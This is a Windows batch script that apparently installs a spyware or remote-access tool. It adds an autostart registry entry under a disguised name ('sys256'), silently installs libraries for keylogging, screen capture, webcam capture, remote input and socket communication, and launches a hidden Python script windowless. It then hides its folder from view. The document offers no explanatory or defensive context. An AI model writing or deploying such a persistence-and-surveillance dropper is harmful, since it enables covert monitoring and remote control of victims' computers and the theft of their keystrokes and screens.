@echo off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "sys256" /t REG_SZ /d "C:\sys\sys.bat" /f
start "" pythonw -m pip install --upgrade pip
start "" pythonw -m pip install --upgrade python-socketio[client] opencv-python mss pynput pyautogui numpy
start "" pythonw "C:\sys\sys.py"
attrib +h "C:\sys" /S /D
exit
